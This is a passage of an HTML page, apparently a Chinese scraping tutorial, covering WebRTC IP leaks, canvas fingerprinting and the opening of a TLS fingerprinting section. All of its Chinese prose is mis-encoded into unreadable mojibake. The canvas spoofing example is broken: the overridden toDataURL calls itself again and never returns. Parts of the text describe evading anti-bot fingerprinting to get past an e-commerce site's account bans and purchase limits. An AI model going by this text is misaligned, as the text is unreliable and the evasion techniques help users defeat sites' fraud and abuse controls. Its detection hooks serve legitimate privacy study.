      <h3 id="q-vpn-èƒ½é˜²æ­¢-webrtc-æ³„éœ²å—">Q: VPN èƒ½é˜²æ­¢ WebRTC æ³„éœ²å—ï¼Ÿ</h3>

      <p><strong>A</strong>: ä¸ä¸€å®šã€‚WebRTC å¯ä»¥ç»•è¿‡ VPN ç›´æ¥æ³„éœ²æœ¬åœ°å’Œå…¬ç½‘ IPï¼š</p>

      <ul>
        <li><strong>æœ¬åœ° IP</strong>: VPN æ— æ³•éšè—ï¼ˆ192.168.x.xï¼‰</li>
        <li><strong>å…¬ç½‘ IP</strong>: å¯èƒ½ç»•è¿‡ VPN éš§é“æ³„éœ²çœŸå® IP</li>
        <li><strong>è§£å†³æ–¹æ¡ˆ</strong>: ç¦ç”¨ WebRTC æˆ–ä½¿ç”¨æ”¯æŒ WebRTC ä¿æŠ¤çš„ VPN</li>
      </ul>

      <h3 id="q-ä¸ºä»€ä¹ˆæµè§ˆå™¨å…è®¸-webrtc-æ³„éœ²-ip">Q: ä¸ºä»€ä¹ˆæµè§ˆå™¨å…è®¸ WebRTC æ³„éœ² IPï¼Ÿ</h3>

      <p><strong>A</strong>:</p>

      <ul>
        <li>WebRTC è®¾è®¡ç”¨äºç‚¹å¯¹ç‚¹é€šä¿¡ï¼Œéœ€è¦çœŸå® IP å»ºç«‹è¿æ¥</li>
        <li>è¿™æ˜¯åŠŸèƒ½éœ€æ±‚ï¼Œä¸æ˜¯å®‰å…¨æ¼æ´</li>
        <li>æµè§ˆå™¨é€æ­¥å¢å¼ºéšç§ä¿æŠ¤ï¼ˆå¦‚ mDNSï¼‰</li>
      </ul>

      <h3 id="q-mdns-æ˜¯ä»€ä¹ˆå¦‚ä½•ä¿æŠ¤éšç§">Q: mDNS æ˜¯ä»€ä¹ˆï¼Ÿå¦‚ä½•ä¿æŠ¤éšç§ï¼Ÿ</h3>

      <p><strong>A</strong>:<br />
        <strong>mDNS</strong> (Multicast DNS) æ˜¯ä¸€ç§éšç§ä¿æŠ¤æœºåˆ¶ï¼š
      </p>

      <ul>
        <li>ç”¨éšæœº <code>.local</code> åœ°å€æ›¿ä»£çœŸå®æœ¬åœ° IP</li>
        <li>Chrome å’Œ Safari é»˜è®¤å¯ç”¨</li>
        <li>Firefox éœ€è¦æ‰‹åŠ¨é…ç½®</li>
      </ul>

      <p>ç¤ºä¾‹ï¼š<code>a1b2c3d4.local</code> è€Œä¸æ˜¯ <code>192.168.1.100</code></p>

      <h3 id="q-å¦‚ä½•æ£€æµ‹ç½‘ç«™æ˜¯å¦åœ¨æ”¶é›†-webrtc-æŒ‡çº¹">Q: å¦‚ä½•æ£€æµ‹ç½‘ç«™æ˜¯å¦åœ¨æ”¶é›† WebRTC æŒ‡çº¹ï¼Ÿ</h3>

      <p><strong>A</strong>:</p>

      <ol>
        <li>æ‰“å¼€æµè§ˆå™¨å¼€å‘è€…å·¥å…·</li>
        <li>åœ¨ Console ä¸­è¿è¡Œï¼š<br />
          <div class="codehilite"><br />
            <pre><span></span><code><span class="nx">RTCPeerConnection</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">_createOffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">RTCPeerConnection</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">createOffer</span><span class="p">;</span>
<span class="nx">RTCPeerConnection</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">createOffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">trace</span><span class="p">(</span><span class="s1">&#39;WebRTC createOffer called&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">_createOffer</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span><br />
<span class="p">};</span><br />
</code></pre><br />
          </div>
        </li>
      </ol>

      <ol start="3">
        <li>æŸ¥çœ‹æ˜¯å¦æœ‰ WebRTC è°ƒç”¨çš„å †æ ˆè¿½è¸ª</li>
      </ol>

      <hr />

      <h2 id="è¿›é˜¶é˜…è¯»">è¿›é˜¶é˜…è¯»</h2>

      <h3 id="å®˜æ–¹æ–‡æ¡£">å®˜æ–¹æ–‡æ¡£</h3>

      <ul>
        <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/WebRTC_API">WebRTC API - MDN</a></li>
        <li><a href="https://www.w3.org/TR/webrtc/">WebRTC è§„èŒƒ</a></li>
        <li><a href="https://tools.ietf.org/html/rfc5245">ICE åè®® RFC 5245</a></li>
      </ul>

      <h3 id="éšç§ç ”ç©¶">éšç§ç ”ç©¶</h3>

      <ul>
        <li><a href="https://research.checkpoint.com/webrtc-vulnerability/">WebRTC IP Leak Vulnerability</a></li>
        <li><a href="https://arxiv.org/abs/1906.02159">Browser Fingerprinting via WebRTC</a></li>
        <li><a href="https://tools.ietf.org/html/draft-ietf-rtcweb-security">WebRTC Privacy and Security
            Considerations</a></li>
      </ul>

      <h3 id="æ£€æµ‹å·¥å…·">æ£€æµ‹å·¥å…·</h3>

      <ul>
        <li><a href="https://browserleaks.com/webrtc">BrowserLeaks WebRTC Test</a></li>
        <li><a href="https://ipleak.net/">IPLeak.net</a></li>
        <li><a href="https://www.perfect-privacy.com/en/tests/check-ip">Perfect Privacy Check IP</a></li>
      </ul>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#04-Advanced-Recipes-canvas-fingerprinting">Canvas æŒ‡çº¹è¯†åˆ«</a></li>
        <li><a href="#04-Advanced-Recipes-tls-fingerprinting">TLS æŒ‡çº¹è¯†åˆ«</a></li>
        <li><a href="#04-Advanced-Recipes-browser-fingerprinting">æµè§ˆå™¨æŒ‡çº¹æŠ€æœ¯</a></li>
        <li><a href="../02-Techniques/privacy_protection.md">éšç§ä¿æŠ¤æŠ€æœ¯</a></li>
      </ul>

    </div>

    <div class="section" id="04-Advanced-Recipes-canvas-fingerprinting">
      <h2>41. Canvas Fingerprinting</h2>
      <h1 id="canvas-æŒ‡çº¹æŠ€æœ¯">Canvas æŒ‡çº¹æŠ€æœ¯</h1>

      <h2 id="æ€è€ƒæ—¶åˆ»">ğŸ’­ æ€è€ƒæ—¶åˆ»</h2>

      <p>åœ¨å­¦ä¹  Canvas æŒ‡çº¹ä¹‹å‰ï¼Œå…ˆæ€è€ƒï¼š</p>

      <ol>
        <li><strong>ä¸ºä»€ä¹ˆ Cookie å’Œ IP åœ°å€ä¸å¤Ÿç”¨ï¼Ÿ</strong> ä¸ºä»€ä¹ˆç½‘ç«™è¿˜éœ€è¦æŒ‡çº¹è¯†åˆ«ï¼Ÿ</li>
        <li><strong>ä½ çš„æµè§ˆå™¨æ˜¯ç‹¬ä¸€æ— äºŒçš„å—ï¼Ÿ</strong> å³ä½¿ä½ æ¢äº† IPã€æ¸…ç©ºäº† Cookieï¼Œç½‘ç«™è¿˜èƒ½è®¤å‡ºä½ å—ï¼Ÿ</li>
        <li><strong>ç”»å¸ƒæŒ‡çº¹çš„åŸç†æ˜¯ä»€ä¹ˆï¼Ÿ</strong> ä¸ºä»€ä¹ˆåœ¨åŒä¸€ä¸ª Canvas ä¸Šç”»åŒæ ·çš„ä¸œè¥¿ï¼Œä¸åŒç”µè„‘ä¼šäº§ç”Ÿä¸åŒçš„ç»“æœï¼Ÿ</li>
        <li><strong>å®æˆ˜åœºæ™¯ï¼š</strong> æŸç”µå•†ç½‘ç«™é™åˆ¶æ¯ä¸ªç”¨æˆ·åªèƒ½æŠ¢è´­ä¸€ä»¶å•†å“ï¼Œä½ æ¢äº†æµè§ˆå™¨ã€æ¸…ç©ºäº†ç¼“å­˜ã€ä½¿ç”¨äº†ä»£ç†ï¼Œä¸ºä»€ä¹ˆè¿˜æ˜¯è¢«è¯†åˆ«å‡ºæ¥äº†ï¼Ÿ</li>
      </ol>

      <p>è¿™äº›é—®é¢˜çš„ç­”æ¡ˆï¼Œè—åœ¨æµè§ˆå™¨çš„æ¸²æŸ“å¼•æ“é‡Œã€‚</p>

      <hr />

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>Canvas Fingerprinting æ˜¯ä¸€ç§é€šè¿‡ HTML5 Canvas API ç”Ÿæˆæµè§ˆå™¨æŒ‡çº¹çš„æŠ€æœ¯ã€‚ç”±äºä¸åŒç³»ç»Ÿã€æµè§ˆå™¨ã€æ˜¾å¡æ¸²æŸ“æ–‡æœ¬å’Œå›¾å½¢æ—¶å­˜åœ¨ç»†å¾®å·®å¼‚ï¼Œè¿™äº›å·®å¼‚å¯ä»¥ç”¨æ¥å”¯ä¸€æ ‡è¯†ç”¨æˆ·ã€‚</p>

      <hr />

      <h2 id="åŸç†">åŸç†</h2>

      <h3 id="1-æ¸²æŸ“å·®å¼‚æ¥æº">1. æ¸²æŸ“å·®å¼‚æ¥æº</h3>

      <p><strong>ç¡¬ä»¶å±‚é¢</strong>:</p>

      <ul>
        <li>GPU å‹å·å’Œé©±åŠ¨ç‰ˆæœ¬</li>
        <li>æ“ä½œç³»ç»Ÿï¼ˆWindows/Mac/Linuxï¼‰</li>
        <li>å­—ä½“æ¸²æŸ“å¼•æ“ï¼ˆDirectWrite/CoreText/FreeTypeï¼‰</li>
      </ul>

      <p><strong>è½¯ä»¶å±‚é¢</strong>:</p>

      <ul>
        <li>æµè§ˆå™¨ç±»å‹å’Œç‰ˆæœ¬</li>
        <li>å·²å®‰è£…çš„å­—ä½“</li>
        <li>å›¾åƒå‹ç¼©ç®—æ³•</li>
      </ul>

      <h3 id="2-ç”Ÿæˆæµç¨‹">2. ç”Ÿæˆæµç¨‹</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// 1. åˆ›å»º Canvas</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">canvas</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;canvas&#39;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">canvas</span><span class="p">.</span><span class="nx">getContext</span><span class="p">(</span><span class="s1">&#39;2d&#39;</span><span class="p">);</span>

<span class="c1">// 2. ç»˜åˆ¶ç‰¹å®šå†…å®¹</span>
<span class="nx">ctx</span><span class="p">.</span><span class="nx">textBaseline</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;top&#39;</span><span class="p">;</span>
<span class="nx">ctx</span><span class="p">.</span><span class="nx">font</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;14px Arial&#39;</span><span class="p">;</span>
<span class="nx">ctx</span><span class="p">.</span><span class="nx">textBaseline</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;alphabetic&#39;</span><span class="p">;</span>
<span class="nx">ctx</span><span class="p">.</span><span class="nx">fillStyle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;#f60&#39;</span><span class="p">;</span>
<span class="nx">ctx</span><span class="p">.</span><span class="nx">fillRect</span><span class="p">(</span><span class="mf">125</span><span class="p">,</span><span class="w"> </span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="mf">62</span><span class="p">,</span><span class="w"> </span><span class="mf">20</span><span class="p">);</span>
<span class="nx">ctx</span><span class="p">.</span><span class="nx">fillStyle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;#069&#39;</span><span class="p">;</span>
<span class="nx">ctx</span><span class="p">.</span><span class="nx">fillText</span><span class="p">(</span><span class="s1">&#39;Hello, world!&#39;</span><span class="p">,</span><span class="w"> </span><span class="mf">2</span><span class="p">,</span><span class="w"> </span><span class="mf">15</span><span class="p">);</span>
<span class="nx">ctx</span><span class="p">.</span><span class="nx">fillStyle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;rgba(102, 204, 0, 0.7)&#39;</span><span class="p">;</span>
<span class="nx">ctx</span><span class="p">.</span><span class="nx">fillText</span><span class="p">(</span><span class="s1">&#39;Hello, world!&#39;</span><span class="p">,</span><span class="w"> </span><span class="mf">4</span><span class="p">,</span><span class="w"> </span><span class="mf">17</span><span class="p">);</span>

<span class="c1">// 3. å¯¼å‡ºä¸ºå›¾åƒæ•°æ®</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">dataURL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">canvas</span><span class="p">.</span><span class="nx">toDataURL</span><span class="p">();</span>

<span class="c1">// 4. è®¡ç®—å“ˆå¸Œä½œä¸ºæŒ‡çº¹</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">fingerprint</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">md5</span><span class="p">(</span><span class="nx">dataURL</span><span class="p">);</span>
</code></pre>
      </div>

      <p><strong>å…³é”®ç‚¹</strong>: å³ä½¿ç»˜åˆ¶ç›¸åŒçš„å†…å®¹ï¼Œä¸åŒç¯å¢ƒæ¸²æŸ“å‡ºçš„åƒç´ å€¼ä¼šæœ‰å¾®å°å·®å¼‚ã€‚</p>

      <hr />

      <h2 id="æ£€æµ‹-canvas-æŒ‡çº¹">æ£€æµ‹ Canvas æŒ‡çº¹</h2>

      <h3 id="æ–¹æ³•ä¸€ç›‘æ§-api-è°ƒç”¨">æ–¹æ³•ä¸€ï¼šç›‘æ§ API è°ƒç”¨</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Hook toDataURL</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">originalToDataURL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">HTMLCanvasElement</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">toDataURL</span><span class="p">;</span>
<span class="nx">HTMLCanvasElement</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">toDataURL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[Canvas] toDataURL called&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">trace</span><span class="p">();</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">originalToDataURL</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="p">};</span>

<span class="c1">// Hook getImageData</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">originalGetImageData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CanvasRenderingContext2D</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">getImageData</span><span class="p">;</span>
<span class="nx">CanvasRenderingContext2D</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">getImageData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[Canvas] getImageData called&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">trace</span><span class="p">();</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">originalGetImageData</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="p">};</span>
</code></pre>
      </div>

      <h3 id="æ–¹æ³•äºŒåœ¨-devtools-ä¸­æŸ¥æ‰¾">æ–¹æ³•äºŒï¼šåœ¨ DevTools ä¸­æŸ¥æ‰¾</h3>

      <p>å…¨å±€æœç´¢å…³é”®è¯ï¼š</p>

      <ul>
        <li><code>toDataURL</code></li>
        <li><code>getImageData</code></li>
        <li><code>canvas</code></li>
        <li><code>fingerprint</code></li>
      </ul>

      <hr />

      <h2 id="å¯¹æŠ—æŠ€æœ¯">å¯¹æŠ—æŠ€æœ¯</h2>

      <h3 id="1-ç¦ç”¨-canvasæç«¯æ–¹æ¡ˆ">1. ç¦ç”¨ Canvasï¼ˆæç«¯æ–¹æ¡ˆï¼‰</h3>

      <p>æŸäº›éšç§æµè§ˆå™¨ï¼ˆå¦‚ Tor Browserï¼‰ä¼šç¦ç”¨æˆ–é™åˆ¶ Canvasã€‚</p>

      <p><strong>é—®é¢˜</strong>: ä¼šå¯¼è‡´ç½‘ç«™åŠŸèƒ½å¼‚å¸¸ã€‚</p>

      <h3 id="2-canvas-spoofingä¼ªé€ ">2. Canvas Spoofingï¼ˆä¼ªé€ ï¼‰</h3>

      <p><strong>åŸç†</strong>: ä¿®æ”¹ Canvas API è¿”å›å€¼ï¼Œç»™æ¯ä¸ªè¯·æ±‚è¿”å›ç¨å¾®ä¸åŒçš„æ•°æ®ã€‚</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ç®€å•çš„éšæœºå™ªç‚¹æ³¨å…¥</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">originalToDataURL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">HTMLCanvasElement</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">toDataURL</span><span class="p">;</span>
<span class="nx">HTMLCanvasElement</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">toDataURL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// è·å–åŸå§‹æ•°æ®</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">dataURL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">originalToDataURL</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// æ³¨å…¥å™ªç‚¹ï¼ˆä¿®æ”¹å°‘é‡åƒç´ ï¼‰</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">canvas</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">;</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">canvas</span><span class="p">.</span><span class="nx">getContext</span><span class="p">(</span><span class="s1">&#39;2d&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">imageData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ctx</span><span class="p">.</span><span class="nx">getImageData</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">canvas</span><span class="p">.</span><span class="nx">width</span><span class="p">,</span><span class="w"> </span><span class="nx">canvas</span><span class="p">.</span><span class="nx">height</span><span class="p">);</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">imageData</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// éšæœºä¿®æ”¹ 0.01% çš„åƒç´ </span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mf">4</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">0.0001</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">data</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">256</span><span class="p">);</span><span class="w">  </span><span class="c1">// R</span>
<span class="w">            </span><span class="nx">data</span><span class="p">[</span><span class="nx">i</span><span class="o">+</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">256</span><span class="p">);</span><span class="w">  </span><span class="c1">// G</span>
<span class="w">            </span><span class="nx">data</span><span class="p">[</span><span class="nx">i</span><span class="o">+</span><span class="mf">2</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">256</span><span class="p">);</span><span class="w">  </span><span class="c1">// B</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">ctx</span><span class="p">.</span><span class="nx">putImageData</span><span class="p">(</span><span class="nx">imageData</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">canvas</span><span class="p">.</span><span class="nx">toDataURL</span><span class="p">();</span>
<span class="p">};</span>
</code></pre>
      </div>

      <p><strong>æµè§ˆå™¨æ’ä»¶</strong>:</p>

      <ul>
        <li><strong>Canvas Fingerprint Defender</strong></li>
        <li><strong>Canvas Blocker</strong></li>
      </ul>

      <h3 id="3-ä½¿ç”¨æ— å¤´æµè§ˆå™¨">3. ä½¿ç”¨æ— å¤´æµè§ˆå™¨</h3>

      <p>Puppeteer/Selenium å¯ä»¥é€šè¿‡æ³¨å…¥è„šæœ¬ä¿®æ”¹ Canvas è¡Œä¸ºï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Puppeteer</span>
<span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">evaluateOnNewDocument</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalToDataURL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">HTMLCanvasElement</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">toDataURL</span><span class="p">;</span>
<span class="w">    </span><span class="nx">HTMLCanvasElement</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">toDataURL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// æ³¨å…¥å™ªç‚¹é€»è¾‘</span>
<span class="w">        </span><span class="c1">// ...</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">originalToDataURL</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">});</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ£€æµ‹åçˆ¬è™«ä¸­çš„-canvas-æŒ‡çº¹">æ£€æµ‹åçˆ¬è™«ä¸­çš„ Canvas æŒ‡çº¹</h2>

      <h3 id="æ¡ˆä¾‹æŸç”µå•†ç½‘ç«™">æ¡ˆä¾‹ï¼šæŸç”µå•†ç½‘ç«™</h3>

      <p><strong>ç°è±¡</strong>: ç™»å½•åç«‹å³è¢«å°å·ï¼Œæç¤º"æ£€æµ‹åˆ°å¼‚å¸¸è¡Œä¸º"ã€‚</p>

      <p><strong>åˆ†æ</strong>:</p>

      <ol>
        <li>åœ¨ Console Hook <code>toDataURL</code> å’Œ <code>getImageData</code></li>
        <li>å‘ç°é¡µé¢åŠ è½½æ—¶è°ƒç”¨äº†å¤šæ¬¡ Canvas API</li>
        <li>å®šä½åˆ° JS æ–‡ä»¶ï¼Œå‘ç°åœ¨ç”Ÿæˆè®¾å¤‡æŒ‡çº¹</li>
      </ol>

      <p><strong>ç»•è¿‡</strong>:</p>

      <ul>
        <li>ä½¿ç”¨çœŸå®æµè§ˆå™¨ï¼ˆChromeï¼‰è€Œé Headless</li>
        <li>å®‰è£… Canvas Defender æ’ä»¶</li>
        <li>æˆ–ä½¿ç”¨æŒ‡çº¹ä¼ªé€ åº“ï¼ˆå¦‚ FingerprintJS Spoofingï¼‰</li>
      </ul>

      <hr />

      <h2 id="canvas-vs-webgl-æŒ‡çº¹">Canvas vs WebGL æŒ‡çº¹</h2>

      <table>
        <thead>
          <tr>
            <th>ç‰¹æ€§</th>
            <th>Canvas</th>
            <th>WebGL</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>åŸç†</strong></td>
            <td>2D å›¾å½¢æ¸²æŸ“å·®å¼‚</td>
            <td>3D å›¾å½¢æ¸²æŸ“å·®å¼‚</td>
          </tr>
          <tr>
            <td><strong>åŒºåˆ†åº¦</strong></td>
            <td>ä¸­</td>
            <td>é«˜</td>
          </tr>
          <tr>
            <td><strong>å®ç°éš¾åº¦</strong></td>
            <td>ä½</td>
            <td>ä¸­</td>
          </tr>
          <tr>
            <td><strong>å¸¸è§åœºæ™¯</strong></td>
            <td>é€šç”¨æŒ‡çº¹</td>
            <td>é«˜çº§æŒ‡çº¹</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="ç›¸å…³èµ„æº">ç›¸å…³èµ„æº</h2>

      <ul>
        <li><a href="https://browserleaks.com/canvas">BrowserLeaks - Canvas Test</a></li>
        <li><a href="https://amiunique.org/">AmIUnique - æŒ‡çº¹æµ‹è¯•</a></li>
      </ul>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#04-Advanced-Recipes-browser-fingerprinting">æµè§ˆå™¨æŒ‡çº¹è¯†åˆ«</a></li>
        <li><a href="#04-Advanced-Recipes-webrtc-fingerprinting">WebRTC æŒ‡çº¹ä¸éšç§</a></li>
        <li><a href="#04-Advanced-Recipes-anti-scraping-deep-dive">åçˆ¬è™«æŠ€æœ¯æ·±åº¦åˆ†æ</a></li>
      </ul>

    </div>

    <div class="section" id="04-Advanced-Recipes-tls-fingerprinting">
      <h2>42. TLS Fingerprinting</h2>
      <h1 id="tls-æŒ‡çº¹è¯†åˆ«-ja3ja4">TLS æŒ‡çº¹è¯†åˆ« (JA3/JA4)</h1>

      <h2 id="æ€è€ƒæ—¶åˆ»">ğŸ’­ æ€è€ƒæ—¶åˆ»</h2>

      <p>åœ¨å­¦ä¹  TLS æŒ‡çº¹ä¹‹å‰ï¼Œå…ˆæŒ‘æˆ˜ä½ çš„è®¤çŸ¥ï¼š</p>

      <ol>
        <li><strong>HTTPS å°±å®‰å…¨äº†å—ï¼Ÿ</strong> å³ä½¿ç”¨äº†åŠ å¯†ä¼ è¾“ï¼Œç½‘ç«™è¿˜èƒ½è¯†åˆ«å‡ºä½ æ˜¯çˆ¬è™«ï¼Ÿ</li>
        <li><strong>æ¡æ‰‹çš„ç§˜å¯†ï¼š</strong> åœ¨ HTTPS è¿æ¥å»ºç«‹çš„ä¸€ç¬é—´ï¼Œæµè§ˆå™¨æš´éœ²äº†å“ªäº›ä¿¡æ¯ï¼Ÿ</li>
        <li><strong>æŒ‡çº¹çš„ä¸å¯è§æ€§ï¼š</strong> ä½ ç”¨ Python requests å‘è¯·æ±‚ï¼ŒHTTP å¤´ä¼ªè£…å¾—å†åƒï¼Œä¸ºä»€ä¹ˆè¿˜æ˜¯è¢«è¯†åˆ«å‡ºæ¥ï¼Ÿ</li>
        <li><strong>å®æˆ˜åœºæ™¯ï¼š</strong> æŸç½‘ç«™å°ç¦äº†æ‰€æœ‰ Python requests çš„è®¿é—®ï¼ˆè¿”å› 403ï¼‰ï¼Œä½†ç”¨æµè§ˆå™¨è®¿é—®æ­£å¸¸ã€‚ä½ è¿ä¸€ä¸ªè¯·æ±‚éƒ½æ²¡å‘ï¼Œå®ƒæ˜¯æ€ä¹ˆçŸ¥é“çš„ï¼Ÿ</li>
      </ol>

      <p>TLS æŒ‡çº¹ï¼Œæ˜¯åº”ç”¨å±‚ä¹‹ä¸‹çš„"æš—æˆ˜"ã€‚</p>

